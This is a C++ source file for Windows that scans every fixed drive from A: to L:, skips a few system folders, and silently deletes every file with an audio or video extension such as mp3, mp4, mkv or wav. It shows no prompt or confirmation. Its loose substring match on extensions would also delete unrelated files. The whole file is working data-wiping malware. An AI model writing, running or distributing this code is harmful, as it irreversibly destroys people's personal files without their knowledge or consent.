#include <iostream>
#include <Windows.h>
#include <string>
#include <functional>
#include <dirent.h>
#include <cstdio>

using namespace std;
const string dir_ignore = "AppData Program Program Files x86 Windows";

void listFiles(const string &path, function<void(const std::string &)> cb) {
    if (auto dir = opendir(path.c_str())) {
        while (auto f = readdir(dir)) {
            // ignore directories that start with a period "."
            if (!f->d_name || f->d_name[0] == '.') continue;
            // if it is a directory loop again
            if (f->d_type == DT_DIR) {
                string di = static_cast<string>(f->d_name);
                size_t start = dir_ignore.find(f->d_name);
                size_t end = dir_ignore.rfind(f->d_name);
                if (start != string::npos) {
                    if (dir_ignore.substr(start, end) == f->d_name) {
                        continue;
                    }
                }
                listFiles(path + f->d_name + "/", cb);
            }
            if (f->d_type == DT_REG)
                cb(path + f->d_name);
        }
        closedir(dir);
    }
}

const char* drive[13] = { "A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\",  "K:\\", "L:\\" };

int main() {
    UINT drives_num;
    int i;
    // loop through fixed drives
    for (i = 0; i < 12; i++) {
        drives_num = GetDriveType(((LPCSTR) drive[i]));
        if (drives_num == DRIVE_FIXED) {
            listFiles(drive[i], [](const string &path) {
                string ext, str;
                ext = path.substr(path.find_last_of('.')+1);
                str = "mp3 mp4 3gp mkv avi webm avi ogg wav";
                if (str.find(ext) != string::npos) {
                    // Delete File
                    const char* patth = path.c_str();
                    remove(patth);
                }
            });
        }
    }
    return 0;
}

